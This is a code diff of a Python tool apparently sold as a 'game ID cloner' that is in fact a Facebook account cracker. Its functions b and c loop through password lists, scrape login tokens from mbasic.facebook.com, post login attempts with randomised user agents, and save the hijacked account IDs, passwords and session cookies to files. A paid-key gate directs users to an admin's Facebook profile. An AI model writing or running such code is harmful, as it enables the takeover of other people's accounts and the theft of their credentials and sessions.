@@ -161,20 +161,28 @@ def menu_apikey():
 │ [✓] VERSION  : 0.1                  
 │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m
 └───────────────────────────────────────┘""")
-  print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER JR ™ \033[1;37m ")
+print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER JR ™ \033[1;37m ")
+  print(f"")
   print(f"\t \033[1;33m  HE IS INTELLIGENT  MEN OF MARVEL  \033[1;37m ")
+  print(f"")
   print(f"\t \033[1;34m  MY  FAVOURITE CHARATER IROM-MAN — SPIDER-MAN\033[1;37m ")
+  print(f"")
   print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
-  print(f" \033[1;33m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")  
-  print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1)   
-  print(f"\033[1;32     YOUR  KEY : "+id)  
-  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1) 
+  print(f"")
+  print(f" \033[1;33m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
+  print(f"")
+  print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1) 
+  print(f"")
+  print(f"\033[1;32     YOUR  KEY : "+id)
+  print(f"")
+  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
+  print(f"")
   print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
   os.system(f'xdg-open https://www.facebook.com/profile.php?id=61551394177803&mibextid=ZbWKwL')
   print(f"");time.sleep(2)
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
-    httpCaht = requests.get("https://github.com/MRX-JIBON-SARKAR/MRX-JIBON/blob/main/MRX-JIBON.txt").text
+    httpCaht = requests.get("https://github.com/MRX-JIBON-SARKAR/Test/blob/main/Test.txt").text
     if id in httpCaht:
       print("\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
       msg = str(os.geteuid())
@@ -432,4 +440,131 @@ def a(uid,pwx,tl):
                 cid = coki[82:97]
                 print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
                 open('/sdcard/MRX-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)                                                              
+                cps.append(uid)                  
+                break
+            else:
+                continue
+        loop+=1
+        
+    except:
+        pass
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [🔢] Number : {uid}')
+                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
+                oks.append(cid)
+                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+def c(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [🔢] Numer : {uid}')
+                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
+                cek_apk(session,coki)
+                oks.append(cid)
+                open('/sdcard/MRX.txt', 'a').write(cid+' | '+ps+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+Main()                        
